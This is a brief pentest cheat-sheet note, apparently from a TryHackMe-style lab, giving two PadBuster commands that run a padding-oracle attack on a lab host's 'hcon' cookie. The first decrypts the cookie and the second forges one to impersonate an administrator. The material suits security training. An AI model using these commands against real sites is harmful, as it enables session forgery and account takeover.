# Cookie Padding

```bash
# https://github.com/AonCyberLabs/PadBuster

# Get cookie structure
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding"

# Get cookie for other user (impersonation)
padbuster http://10.10.119.56/index.php xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka 8 -cookies "hcon=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka" -error "Invalid padding" -plaintext 'user=administratorhc0nwithyhackme'
```

